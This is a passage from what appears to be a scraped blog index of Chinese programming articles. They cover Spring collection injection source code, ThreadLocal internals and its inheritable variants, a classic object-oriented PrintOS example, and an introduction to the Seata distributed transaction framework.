@Nullablepublic Object doResolveDependency(DependencyDescriptor descriptor, @Nullable String beanName, @Nullable Set&lt;String&gt; autowiredBeanNames, @Nullable TypeConverter typeConverter) throws BeansException { InjectionPoint previousInjectionPoint = ConstructorResolver.setCurrentInjectionPoint(descriptor); try { // ... // 集合依赖，如 Array、List、Set、Map。 Object multipleBeans = resolveMultipleBeans(descriptor, beanName, autowiredBeanNames, typeConverter); if (multipleBeans != null) { return multipleBeans; } // ... }} 最终调用resolveMultipleBeans方法 private Object resolveMultipleBeans(DependencyDescriptor descriptor, @Nullable String beanName, @Nullable Set&lt;String&gt; autowiredBeanNames, @Nullable TypeConverter typeConverter) { Class&lt;?&gt; type = descriptor.getDependencyType(); // Stream 类型 if (descriptor instanceof StreamDependencyDescriptor) { Map&lt;String, Object&gt; matchingBeans = findAutowireCandidates(beanName, type, descriptor); if (autowiredBeanNames != null) { autowiredBeanNames.addAll(matchingBeans.keySet()); } Stream&lt;Object&gt; stream = matchingBeans.keySet().stream() .map(name -&gt; descriptor.resolveCandidate(name, type, this)) .filter(bean -&gt; !(bean instanceof NullBean)); if (((StreamDependencyDescriptor) descriptor).isOrdered()) { stream = stream.sorted(adaptOrderComparator(matchingBeans)); } return stream; } // Array else if (type.isArray()) { Class&lt;?&gt; componentType = type.getComponentType(); ResolvableType resolvableType = descriptor.getResolvableType(); Class&lt;?&gt; resolvedArrayType = resolvableType.resolve(type); if (resolvedArrayType != type) { componentType = resolvableType.getComponentType().resolve(); } if (componentType == null) { return null; } Map&lt;String, Object&gt; matchingBeans = findAutowireCandidates(beanName, componentType, new MultiElementDescriptor(descriptor)); if (matchingBeans.isEmpty()) { return null; } if (autowiredBeanNames != null) { autowiredBeanNames.addAll(matchingBeans.keySet()); } TypeConverter converter = (typeConverter != null ? typeConverter : getTypeConverter()); Object result = converter.convertIfNecessary(matchingBeans.values(), resolvedArrayType); if (result instanceof Object[]) { Comparator&lt;Object&gt; comparator = adaptDependencyComparator(matchingBeans); if (comparator != null) { Arrays.sort((Object[]) result, comparator); } } return result; } // 集合 else if (Collection.class.isAssignableFrom(type) &amp;&amp; type.isInterface()) { Class&lt;?&gt; elementType = descriptor.getResolvableType().asCollection().resolveGeneric(); if (elementType == null) { return null; } Map&lt;String, Object&gt; matchingBeans = findAutowireCandidates(beanName, elementType, new MultiElementDescriptor(descriptor)); if (matchingBeans.isEmpty()) { return null; } if (autowiredBeanNames != null) { autowiredBeanNames.addAll(matchingBeans.keySet()); } TypeConverter converter = (typeConverter != null ? typeConverter : getTypeConverter()); Object result = converter.convertIfNecessary(matchingBeans.values(), type); if (result instanceof List) { if (((List&lt;?&gt;) result).size() &gt; 1) { Comparator&lt;Object&gt; comparator = adaptDependencyComparator(matchingBeans); if (comparator != null) { ((List&lt;?&gt;) result).sort(comparator); } } } return result; } // Map else if (Map.class == type) { ResolvableType mapType = descriptor.getResolvableType().asMap(); Class&lt;?&gt; keyType = mapType.resolveGeneric(0); if (String.class != keyType) { return null; } Class&lt;?&gt; valueType = mapType.resolveGeneric(1); if (valueType == null) { return null; } Map&lt;String, Object&gt; matchingBeans = findAutowireCandidates(beanName, valueType, new MultiElementDescriptor(descriptor)); if (matchingBeans.isEmpty()) { return null; } if (autowiredBeanNames != null) { autowiredBeanNames.addAll(matchingBeans.keySet()); } return matchingBeans; } else { return null; }} 从源码发现，不仅仅可以注入数组、集合和Map，还可以注入 Stream。 总结Spring按类型注入不仅仅注入简单的Bean，还可以注入一些数组、集合、Map 以及 Stream。 如果想进一步了解这一块可以看看这篇文章Spring IoC 依赖注入（三）resolveDependency","link":"/2020/09/29/Spring%E7%9A%84%E5%A4%8D%E6%9D%82%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/"},{"title":"ThreadLocal原理分析和拓展","text":"多线程访问同一个共享变量由于线程的执行顺序和变量的可见性原因会导致并发问题，我们一般会有两种解决思路： 一是对访问的变量进行加锁处理 二是每个线程都访问本线程的变量 本次我们重点分析Java中通过ThreadLocal实现的本地变量 ThreadLocal实现原理当使用ThreadLocal维护变量的时候，该变量存储在线程的本地，其他线程无法访问，做到了线程间的隔离，也就没有线程安全的问题了。 每一个Thread中都会有一个ThreadLocalMap对象， ThreadLocalMap 中有一个 Entry 数组 Entry中key是ThreadLocal对象实例 ，继承自WeakReference（弱引用），value就是我们要设置的值 我们首先来看一下 ThreadLocalMap 是一个静态内部类 static class ThreadLocalMap { // key是弱引用 static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; { Object value; Entry(ThreadLocal&lt;?&gt; k, Object v) { super(k); value = v; } } // 初始容量，必须为二的整数幂 private static final int INITIAL_CAPACITY = 16; // map中储存Entry的量 private Entry[] table; // 总共储存了多少对象 private int size = 0; // 下次扩容的数量 private int threshold; // Default to 0} 接下看看如何设置值 public void set(T value) { // 获取当前线程 Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); // 如果不为空就设置值，为空就创建 if (map != null) { map.set(this, value); } else { createMap(t, value); }}// 获取 ThreadLocalMapThreadLocalMap getMap(Thread t) { return t.threadLocals;}// 创建 ThreadLocalMapvoid createMap(Thread t, T firstValue) { t.threadLocals = new ThreadLocalMap(this, firstValue);} 内存泄漏原因 TheadLocal 本身不存储值，它只是做为一个key，来让线程从ThreadLocal中获取value ThreadLocalMap 是使用ThreadLocal的弱引用做为key的，一个对象如果只剩下弱引用（没有强引用），该对象在GC就会被回收 如果我们手动将 ThreadLocal A 的对象赋值为 null，这个 ThreadLocal A 就会被回收，ThreadLocalMap 中就会出现 key 为 null 的 Entry。 Java 程序没有办法访问这些 key 为 null 的Entry的value，如果当前线程迟迟不结束，使用的线程池，或者该线程需要执行一些耗时任务，在系统值就会出现一条强引用链，从 ThreadRef -&gt; Thread B -&gt; ThreadLocalMap -&gt; value -&gt; Obj C 这个value就无法回收，导致内存泄漏。 只有当前线程结束之后，ThreadRef 不存在栈中，强引用断开才能被回收。 实际上 ThreadLocal 也考虑了防护措施，在调用 ThreadLocal 的 get()、set() 方法的时候，会清除ThreadLocalMap 中 key 为 null 的值。主要调用的是 expungeStaleEntry方法。 避免内存泄漏的最好做法：主动调用ThreadLocal对象的 remove 方法，将ThreadLocal 对象的值删除。 /** * @author cuzz * @date 2021/8/14 17:29 */public class ThreadLocalMemoryLeak { private static final int SIZE = 1000; static ThreadPoolExecutor executor = new ThreadPoolExecutor( 5,5,1, TimeUnit.MINUTES, new LinkedBlockingQueue&lt;&gt;(1000) ); @Data static class Memory5M { public Memory5M(int i) { this.i = i; } private int i; private byte[] m = new byte[1024 * 1024 * 5]; } static ThreadLocal&lt;Memory5M&gt; threadLocal = new ThreadLocal&lt;&gt;(); public static void main(String[] args) throws InterruptedException { for (int i = 0; i &lt; SIZE; i++) { int finalI = i; executor.execute(()-&gt; { threadLocal.set(new Memory5M(finalI)); // 执行 task(); // 删除，不删除会产生内存泄漏 threadLocal.remove(); }); Thread.sleep(100); } System.out.println(&quot;done&quot;); } private static void task() { Memory5M memory5M = threadLocal.get(); int i = memory5M.getI(); System.out.printf(&quot;task %s process...\\n&quot;, i); }} InheritableThreadLoca原理分析在子线程中如何获取父线程的本地变量 先看一个例子 /** * @author cuzz * @date 2021/08/14 20:19 */public class ThreadLocalDemo { private static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;(); public static void main(String[] args) throws InterruptedException { threadLocal.set(&quot;aaa&quot;); System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); new Thread(()-&gt;{ System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); }).start(); TimeUnit.SECONDS.sleep(1); }} 输出结果，可以看到父线程输出的是 aaa，子线程输出的为 null main&gt;&gt;&gt;aaaThread-0&gt;&gt;&gt;null 这个时候，改用为 InheritableThreadLocal /** * @author cuzz * @date 2021/08/14 20:19 */public class ThreadLocalDemo { // private static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;(); private static ThreadLocal&lt;String&gt; threadLocal = new InheritableThreadLocal&lt;&gt;(); public static void main(String[] args) throws InterruptedException { threadLocal.set(&quot;aaa&quot;); System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); new Thread(()-&gt;{ System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); }).start(); TimeUnit.SECONDS.sleep(1); }} 这个时候输出结果 main&gt;&gt;&gt;aaaThread-0&gt;&gt;&gt;aaa 源码分析，InheritableThreadLocal 继承 ThreadLocal 并实现了以下3个方法。 public class InheritableThreadLocal&lt;T&gt; extends ThreadLocal&lt;T&gt; { protected T childValue(T parentValue) { return parentValue; } ThreadLocalMap getMap(Thread t) { return t.inheritableThreadLocals; } void createMap(Thread t, T firstValue) { t.inheritableThreadLocals = new ThreadLocalMap(this, firstValue); }} Thread维护了两个ThreadLocalMap /* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ThreadLocal.ThreadLocalMap threadLocals = null;/** InheritableThreadLocal values pertaining to this thread. This map is* maintained by the InheritableThreadLocal class.*/ThreadLocal.ThreadLocalMap inheritableThreadLocals = null; 现在看看Thread中 public Thread(Runnable target) { this(null, target, &quot;Thread-&quot; + nextThreadNum(), 0);}public Thread(ThreadGroup group, Runnable target, String name, long stackSize) { this(group, target, name, stackSize, null, true);}private Thread(ThreadGroup g, Runnable target, String name, long stackSize, AccessControlContext acc, boolean inheritThreadLocals) { if (name == null) { throw new NullPointerException(&quot;name cannot be null&quot;); } this.name = name; // ... // 这里会把父线程的ThreadLocal传递到子线程 if (inheritThreadLocals &amp;&amp; parent.inheritableThreadLocals != null) this.inheritableThreadLocals = ThreadLocal.createInheritedMap(parent.inheritableThreadLocals); /* Stash the specified stack size in case the VM cares */ this.stackSize = stackSize; /* Set thread ID */ this.tid = nextThreadID();} 最后 ThreadLocal.createInheritedMap这个方法，遍历父线的ThreadLocalMap中的值保存到自己的ThreadLocalMap中 static ThreadLocalMap createInheritedMap(ThreadLocalMap parentMap) { return new ThreadLocalMap(parentMap);} private ThreadLocalMap(ThreadLocalMap parentMap) { Entry[] parentTable = parentMap.table; int len = parentTable.length; setThreshold(len); table = new Entry[len]; for (Entry e : parentTable) { if (e != null) { @SuppressWarnings(&quot;unchecked&quot;) ThreadLocal&lt;Object&gt; key = (ThreadLocal&lt;Object&gt;) e.get(); if (key != null) { Object value = key.childValue(e.value); Entry c = new Entry(key, value); int h = key.threadLocalHashCode &amp; (len - 1); while (table[h] != null) h = nextIndex(h, len); table[h] = c; size++; } } } 注意的问题： 如果存储的是基本类型，那没有什么问题，如果存储的是自定义对象，那么父类和子类都是引用同一个对象，会相互影响。 package com.cuzz.threadlocal;import lombok.AllArgsConstructor;import lombok.Data;import java.util.concurrent.TimeUnit;/** * @author cuzz * @date 2021/08/14 20:19 */public class ThreadLocalDemo { // private static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;(); private static ThreadLocal&lt;Person&gt; threadLocal = new InheritableThreadLocal&lt;&gt;(); @Data @AllArgsConstructor static class Person{ private String name; private Integer age; } public static void main(String[] args) throws InterruptedException { threadLocal.set(new Person(&quot;cuzz&quot;, 18)); System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); new Thread(()-&gt;{ System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); Person person = threadLocal.get(); person.setName(&quot;faker&quot;); person.setAge(20); }).start(); TimeUnit.SECONDS.sleep(1); System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); }} 我们发现主线程ThreadLocal的值已经被子线程锁改变了。 main&gt;&gt;&gt;ThreadLocalDemo.Person(name=cuzz, age=18)Thread-0&gt;&gt;&gt;ThreadLocalDemo.Person(name=cuzz, age=18)main&gt;&gt;&gt;ThreadLocalDemo.Person(name=faker, age=20) 这个时候我们可以自定义MyInheritableThreadLocal 重写childValue方法，做一个深拷贝就行。 /** * @author cuzz * @date 2021/8/14 21:24 */public class MyInheritableThreadLocal&lt;T&gt; extends InheritableThreadLocal&lt;T&gt;{ @Override protected T childValue(T parentValue) { ObjectMapper objectMapper = new ObjectMapper(); try { String s = objectMapper.writeValueAsString(parentValue); return (T) objectMapper.readValue(s, parentValue.getClass()); } catch (Exception e) { e.printStackTrace(); } return null; }} 测试 package com.cuzz.threadlocal;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;import java.util.concurrent.TimeUnit;/** * @author cuzz * @date 2021/08/14 20:19 */public class ThreadLocalDemo { // private static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;(); // private static ThreadLocal&lt;Person&gt; threadLocal = new InheritableThreadLocal&lt;&gt;(); private static ThreadLocal&lt;Person&gt; threadLocal = new MyInheritableThreadLocal&lt;&gt;(); @Data @AllArgsConstructor @NoArgsConstructor static class Person{ private String name; private Integer age; } public static void main(String[] args) throws InterruptedException { threadLocal.set(new Person(&quot;cuzz&quot;, 18)); System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); new Thread(()-&gt;{ System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); Person person = threadLocal.get(); person.setName(&quot;faker&quot;); person.setAge(20); }).start(); TimeUnit.SECONDS.sleep(1); System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); }} 发现已经不影响了 main&gt;&gt;&gt;ThreadLocalDemo.Person(name=cuzz, age=18)Thread-0&gt;&gt;&gt;ThreadLocalDemo.Person(name=cuzz, age=18)main&gt;&gt;&gt;ThreadLocalDemo.Person(name=cuzz, age=18) TransmittableThreadLocal 原理分析在线程池中如何获取父线程本地变量 我们知道使用InheritableThreadLocal只有在子线程创建的时候回继承父线程的本地变量，之后就不会再次拷贝了。 使用线程池提交任务，线程都是提前创建好的。 如果想每次提交任务都拷贝父线程的本地变量就要用到阿里开源的 TransmittableThreadLocal 是为了解决线程池或其他缓存线程组件下传递ThreadLocal的拓展。 使用也特别简单 package com.cuzz.threadlocal;import com.alibaba.ttl.TransmittableThreadLocal;import com.alibaba.ttl.threadpool.TtlExecutors;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;import java.util.concurrent.ExecutorService;import java.util.concurrent.LinkedBlockingQueue;import java.util.concurrent.ThreadPoolExecutor;import java.util.concurrent.TimeUnit;/** * @author cuzz * @date 2021/8/14 22:09 */public class TransmittableThreadLocalDemo { private static ThreadLocal&lt;Person&gt; threadLocal = new TransmittableThreadLocal&lt;&gt;(); static ExecutorService executorService = new ThreadPoolExecutor( 5,5,1, TimeUnit.MINUTES, new LinkedBlockingQueue&lt;&gt;(1000) ); @Data @AllArgsConstructor @NoArgsConstructor static class Person{ private String name; private Integer age; } public static void main(String[] args) { // 包装一下 executorService = TtlExecutors.getTtlExecutorService(executorService); threadLocal.set(new Person(&quot;cuzz&quot;, 18)); executorService.submit(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); }); threadLocal.set(new Person(&quot;faker&quot;, 20)); executorService.submit(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot;&gt;&gt;&gt;&quot; + threadLocal.get()); }); }} 发送每次都是再提交任务的时候传递父线程的本地变量 pool-1-thread-1&gt;&gt;&gt;TransmittableThreadLocalDemo.Person(name=cuzz, age=18)pool-1-thread-2&gt;&gt;&gt;TransmittableThreadLocalDemo.Person(name=faker, age=20) 具体 参考 ThreadLocal如何在父子线程及线程池中传递？ https://github.com/alibaba/transmittable-thread-local","link":"/2021/08/14/ThreadLocal%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"title":"Understanding Object Oriented Programming","text":"这是一篇很早的文章，讲的关于面向对象，原文地址：Understanding Object Oriented Programming。这里有关于这篇文章的评论如此理解面向对象编程，很有有趣。我觉得这篇作为一篇入门讲面向对象的例子还是很不错的，通过不同的例子讲述了不同人的实现想法。最后用策略模式+工厂模式来实现，来达到消除if-else。 The code on this page grew out of a discussion on the Object Technology in Computer Science Education list server. The discussion had been going on for about 36 hours in late March and early April 2000 centered on the question of “What is OO really; is it a real paradigm, different from procedural programming or is it just a packaging mechanism for procedural programming?” Both of the authors believe that it is a real paradigm shift, requiring a change in mental model in the practitioners. Winder produced the first three of the following code fragments to show the difference in styles between hackers, procedural programmers, and (naive) object oriented programmers. Bergin then added the more sophisticated OO version that appears last. TheProblemThe problem to be solved is to output a value judgment about operating systems. The assumptions being (of course) that UNIX is good and Windows is bad. Hacker Solutionpublic class PrintOS { public static void main(final String[] args) { String osName = System.getProperty(&quot;os.name&quot;); if (osName.equals(&quot;SunOS&quot;) || osName.equals(&quot;Linux&quot;)) { System.out.println(&quot;This is a UNIX box and therefore good.&quot;); } else if (osName.equals(&quot;Windows NT&quot;) || osName.equals(&quot;Windows 95&quot;)) { System.out.println(&quot;This is a Windows box and therefore bad.&quot;); } else { System.out.println(&quot;This is not a box.&quot;); } }} Their claim: It works doesn’t it what more do you want? Also I got mine implemented and working faster than any of the others, so there. Evaluation: While this solves the problem, it would not be easy to modify in the future if the problem changes. In particular, if we need to add new operating systems, we need to extend the if structure. If we want to add additional functionality for each operating system, we would likely see this expand to nested if statements. This would get unwieldy over time. Thus, the hacker has solved the immediate problem, but made little progress on future evolution of the program. Procedural Solutionpublic class PrintOS { private static String unixBox() { return &quot;This is a UNIX box and therefore good.&quot;; } private static String windowsBox() { return &quot;This is a Windows box and therefore bad.&quot;; } private static String defaultBox() { return &quot;This is not a box.&quot;; } private static String getTheString(final String osName) { if (osName.equals(&quot;SunOS&quot;) || osName.equals(&quot;Linux&quot;)) { return unixBox(); } else if (osName.equals(&quot;Windows NT&quot;) || osName.equals(&quot;Windows 95&quot;)) { return windowsBox(); } else { return defaultBox(); } } public static void main(final String[] args) { System.out.println(getTheString(System.getProperty(&quot;os.name&quot;))); }} Their claim: Java is a wonderful procedural programming language; it naturally supports top-down decomposition which is clearly the only way of analyzing and designing quality solutions to problems – as exemplified by this example. Evaluation: The procedural programmer has made some progress on the larger problem. If an operating system needs to be added, we extend the if statement in the getTheString function and add a new function for that OS. However, if the functionality of each OS needs to be extended, what we are likely to see is that the if statement will most likely be replicated elsewhere in the program each time we need to make the distinction between operating systems. Once that happens, whenever we add a new OS or change or add functionality we will need to find ALL of these if statements and update them compatibly*. This is very error prone and results in entropy setting into such programs over time. In effect the programmer is using ad-hoc polymorphism. We want different things to happen, but the programmer must specifically make the choice of what is to happen in each instance. Naive Object Oriented SolutionThis solution requires several classes in several files. // PrintOS.javapublic class PrintOS { public static void main(final String[] args) { System.out.println(OSDiscriminator.getBoxSpecifier().getStatement()); }}// ---------------// OSDiscriminator.javapublic class OSDiscriminator { // Factory Pattern private static BoxSpecifier theBoxSpecifier = null; public static BoxSpecifier getBoxSpecifier() { if (theBoxSpecifier == null) { String osName = System.getProperty(&quot;os.name&quot;); if (osName.equals(&quot;SunOS&quot;) || osName.equals(&quot;Linux&quot;)) { theBoxSpecifier = new UNIXBox(); } else if (osName.equals(&quot;Windows NT&quot;) || osName.equals(&quot;Windows 95&quot;)) { theBoxSpecifier = new WindowsBox(); } else { theBoxSpecifier = new DefaultBox(); } } return theBoxSpecifier; }}// ---------------// BoxSpecifier.javapublic interface BoxSpecifier { String getStatement();}// ---------------// DefaultBox.javapublic class DefaultBox implements BoxSpecifier { @Override public String getStatement() { return &quot;This is not a box.&quot;; }}// ---------------// UNIXBox.javapublic class UNIXBox implements BoxSpecifier { @Override public String getStatement() { return &quot;This is a UNIX box and therefore good.&quot;; }}// ---------------// WindowsBox.javapublic class WindowsBox implements BoxSpecifier { @Override public String getStatement() { return &quot;This is a Windows box and therefore bad.&quot;; }} Their claim: Well I managed to get both Singleton and Factory Method into the implementation so according to all the hype about object-oriented programming and patterns it must be good. Note: The factory here is a kind of naive singleton. Evaluation This programmer has made quite a lot more progress toward the goal of writing a maintainable program. In particular, if we need to add an OS, we extend the if statement as before, and write a new class for that OS. This is similar to what the procedural programmer had to do. However, if we need to add functionality for each OS, we only need to change the classes that deal with that OS. The if statement in OSDiscriminator is still a “logic bottleneck” but it is the only one in the program. This means that the location of change is easy to find (the classes that implement the functionality). Also, if we add functionality by changing the interface BoxSpecifier, then the compiler will tell us if some class fails to implement the new required functionality. We won’t have to search the program for the locus of each change with no help from the tools. However, this solution still does ad-hoc polymorphism in the if statement. Object oriented programming attempts to remove all such ad-hoc decision making. Every if and every switch should be viewed as a lost opportunity for dynamic polymorphism. If we can replace this with dynamic polymorphism then the program will be much easier to maintain. Sophisticated Object Oriented + Patterns SolutionIn the following, PrintOS.java and BoxSpecifier.java are unchanged from the above. // PrintOS.javapublic class PrintOS { public static void main(final String[] args) { System.out.println(OSDiscriminator.getBoxSpecifier().getStatement()); }}// ----------// OSDiscriminator.javapublic class OSDiscriminator {// Factory Pattern private static java.util.HashMap storage = new java.util.HashMap(); public static BoxSpecifier getBoxSpecifier() { BoxSpecifier value = (BoxSpecifier) storage.get(System.getProperty(&quot;os.name&quot;)); if (value == null) return DefaultBox.value; return value; } public static void register(final String key, final BoxSpecifier value) { storage.put(key, value); // Should guard against null keys, actually. } static { WindowsBox.register(); UNIXBox.register(); MacBox.register(); }}// ----------// BoxSpecifier.javapublic interface BoxSpecifier { String getStatement();}// ----------// DefaultBox.javapublic class DefaultBox implements BoxSpecifier {// Singleton Pattern public static final DefaultBox value = new DefaultBox(); private DefaultBox() { } @Override public String getStatement() { return &quot;This is not a box.&quot;; }}// ----------// UNIXBox.javapublic class UNIXBox implements BoxSpecifier {// Singleton Pattern public static final UNIXBox value = new UNIXBox(); private UNIXBox() { } @Override public String getStatement() { return &quot;This is a UNIX box and therefore good.&quot;; } public static final void register() { OSDiscriminator.register(&quot;SunOS&quot;, value); OSDiscriminator.register(&quot;Linux&quot;, value); }}// ----------// WindowsBox.javapublic class WindowsBox implements BoxSpecifier {// Singleton Pattern public static final WindowsBox value = new WindowsBox(); private WindowsBox() { } @Override public String getStatement() { return &quot;This is a Windows box and therefore bad.&quot;; } public static final void register() { OSDiscriminator.register(&quot;Windows NT&quot;, value); OSDiscriminator.register(&quot;Windows 95&quot;, value); }}// ----------// MacBox.javapublic class MacBox implements BoxSpecifier { // Singleton Pattern public static final MacBox value = new MacBox(); private MacBox() { } @Override public String getStatement() { return &quot;This is a Macintosh box and therefore far superior.&quot;; } public static final void register() { OSDiscriminator.register(&quot;Mac OS&quot;, value); }} Their claim: Aaaaahhhhh. And besides, I added important functionality – Mac OS. Evaluation Here we have turned the OS objects into singletons, so there can be only one such object in each of these classes. This may be desirable or not. If it is not, then the factory wouldn’t return the objects in the hash table, but would return clones of them instead. Here we have maintainable code. To add a new OS, like the Mac OS, we just add a new class and add its registration to the factory. To change the functionality we change the OS classes. To add new functionality, we either modify the OS classes, or extend them. Note that there is NO ad-hoc polymorphism here except the single test for null in the factory. DeconstructionWhether it is clear or not, the mental processes of the programmers who wrote these different versions was quite different. The hacker wanted to get the immediate job done at all cost. The procedural programmer views the nature of computation as a decomposition of a function into sub-functions (helper functions) that solve sub-problems. The object-oriented programmers see the nature of computation as a swarm of interacting agents that provide services for other objects. Further, the sophisticated OO programmer lets the system take care of all polymorphic tasks possible. This programmer sees the essence of object oriented programming as the naive object-oriented programmer may not. NotesSingleton and Factory are discussed in Design Patterns by Gamma, Helm, Johnson, and Vlissides (Addison-Wesley, 1995). This is the now famous “Gang of Four” or GOF book. The DefaultBox is a kind of Null Object. This pattern is by Bobby Wolfe and can be found in Pattern Languages of Program Design 3, edited by Martin, Riehle, and Buschmann (Addison-Wesley, 1998) While object oriented programmers try to avoid ad-hoc polymorphism it isn’t always possible. The hard-to-impossible cases are when dealing with primitive (non-object) data in hybrid languages like Java, parsing input, and when creating new objects. Here, however, we have solved the creational problem with a simple factory containing singletons. The creational problem can be solved in general through the use of reflection, such as the Java Reflection API. The other situations are less tractable. For more on ad-hoc polymorphism, see Bergin’s Selection Patterns.For more on dynamic polymorphism, see Bergin’s Polymorphism Patterns.For more on how the object oriented programmer thinks, see Bergin’s Object Patterns. MoreHere is another perspective on the same ideas from out friend and colleague Dung X. Nguyen of Rice University. By the way, Dung has done a lot with using patterns to enhance object-oriented code seen by students. He often works with Stephen Wong of Oberlin College. They have some nice papers on this in the last few SIGCSE conference proceedings. Note: For a discussion on why replicated code, such as that in the if structure of the procedural solution, is bad see Kent Beck’s discussion on OnceAndOnlyOnce on the Wiki Wiki Web. Last Updated: July 30, 2000","link":"/2020/08/25/Understanding_Object_Oriented_Programming/"},{"title":"分布式事务框架Seata","text":"分布式基础CAP 定理CAP 定理指的是在一个分布式系统中， Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性），三者不可兼得。在分布式系统中，分区容错性是必须需要实现的。所以只能在一致性和可用性之间进行权衡（AP 或者 CP）。 BASE 理论BASE 是 Basically Available（基本可用）、Soft state（软状态）和 Eventually consistent（最终一致性）三个短语的缩写。是对 CAP 中 AP 的一个扩展 BA 基本可用：分布式系统在出现故障时，允许损失部分可用功能，保证核心功能可用。 S 软状态：允许系统中存在中间状态，这个状态不影响系统可用性，这里指的是 CAP 中的不一致。 E 最终一致：最终一致是指经过一段时间后，所有节点数据都将会达到一致。 BASE 解决了 CAP 中理论没有网络延迟，在 BASE 中用软状态和最终一致，保证了延迟后的一致性。 BASE 和 ACID 是相反的，它完全不同于 ACID 的强一致性模型，而是通过牺牲强一致性来获得可用性，并允许数据在一段时间内是不一致的，但最终达到一致状态。 分布式事务实现方式 XA 方案(两阶段提交) TCC 方案 本地消息表 可靠消息最终一致性方案 最大努力通知方案 Seata简介Seata (Simple Extensible Autonomous Transaction Architecture) 是阿里巴巴开源的分布式事务中间件，，解决微服务场景下面临的分布式事务问题。 具体看 Seata 官网： Seata主要由三个重要组件组成： Transaction Coordinator(TC)：管理全局的分支事务的状态，用于全局性事务的提交和回滚。 Transaction Manager(TM)：事务管理器，用于开启全局事务、提交或者回滚全局事务，是全局事务的开启者。 Resource Manager(RM)：资源管理器，用于分支事务上的资源管理，向 TC 注册分支事务，上报分支事务的状态，接受 TC 的命令来提交或者回滚分支事务。 Seata 两种模式Seata 关注的就是微服务架构下的数据一致性问题，是一整套的分布式事务解决方案。Seata 框架包含两种模式，一种是 AT 模式。AT 模式主要从数据分片的角度，关注多 DB 访问的数据一致性，当然也包括多服务下的多 DB 数据访问一致性问题。 另外一个就是 TCC 模式，TCC 模式主要关注业务拆分，在按照业务横向扩展资源时，解决微服务间调用的一致性问题，保证读资源访问的事务属性。 AT 模式AT 模式是通过两段提交的方式实现，AT 模式下，把每个数据库被当做是一个 Resource，Seata 里称为 DataSource Resource。业务通过 JDBC 标准接口访问数据库资源时，Seata 框架会对所有请求进行拦截，做一些操作。每个本地事务提交时，Seata RM（Resource Manager，资源管理器） 都会向 TC（Transaction Coordinator，事务协调器） 注册一个分支事务。当请求链路调用完成后，发起方通知 TC 提交或回滚分布式事务，进入二阶段调用流程。此时，TC 会根据之前注册的分支事务回调到对应参与者去执行对应资源的第二阶段。TC 是怎么找到分支事务与资源的对应关系呢？每个资源都有一个全局唯一的资源 ID，并且在初始化时用该 ID 向 TC 注册资源。在运行时，每个分支事务的注册都会带上其资源 ID。这样 TC 就能在二阶段调用时正确找到对应的资源。 这就是我们的 AT 模式。简单总结一下，就是把每个数据库当做一个 Resource，在本地事务提交时会去注册一个分支事务。 这种模式是对业务零入侵，并发没那么高。 TCC 模式TCC 模型是把锁的粒度完全交给业务处理，它需要每个子事务业务都实现Try-Confirm / Cancel 接口。 TCC 模式本质也是 2PC ，只是 TCC 在应用层控制。 Try: 尝试执行业务 完成所有业务检查（一致性） 预留必须业务资源（准隔离性） Confirm: 确认执行业务； 真正执行业务，不作任何业务检查 只使用Try阶段预留的业务资源 Confirm 操作满足幂等性 Cancel: 取消执行业务 释放Try阶段预留的业务资源 Cancel操作满足幂等性 这三个阶段，都会按本地事务的方式执行。不同于 XA 的 prepare ，TCC 无需将 XA 的投票期间的所有资源挂起，因此极大的提高了吞吐量。 那么对应到 TCC 模式里，也是一样的，Seata 框架把每组 TCC 接口当做一个 Resource，称为 TCC Resource。这套 TCC 接口可以是 RPC，也以是服务内 JVM 调用。在业务启动时，Seata 框架会自动扫描识别到 TCC 接口的调用方和发布方。如果是 RPC 的话，就是 sofa:reference、sofa:service、dubbo:reference、dubbo:service 等。 扫描到 TCC 接口的调用方和发布方之后。如果是发布方，会在业务启动时向 TC 注册 TCC Resource，与 DataSource Resource 一样，每个资源也会带有一个资源 ID。 如果是调用方，Seata 框架会给调用方加上切面，与 AT 模式一样，在运行时，该切面会拦截所有对 TCC 接口的调用。每调用一次 Try 接口，切面会先向 TC 注册一个分支事务，然后才去执行原来的 RPC 调用。当请求链路调用完成后，TC 通过分支事务的资源 ID 回调到正确的参与者去执行对应 TCC 资源的 Confirm 或 Cancel 方法。 在讲完了整个框架模型以后，大家可能会问 TCC 三个接口怎么实现。因为框架本身很简单，主要是扫描 TCC 接口，注册资源，拦截接口调用，注册分支事务，最后回调二阶段接口。最核心的实际上是 TCC 接口的实现逻辑。下面我将根据蚂蚁金服内部多年的实践来为大家分析怎么实现一个完备的 TCC 接口。 运行 Demo官方Demo 下面是 dubbo 的例子，运行后报错可以看到回滚信息： INFO [rpcDispatch_RMROLE_4_8] - onMessage:xid=10.116.22.63:8091:2016481020,branchId=2016481022,branchType=AT,resourceId=jdbc:mysql://localhost:3306/fescar_demo?serverTimezone=UTC,applicationData=null INFO 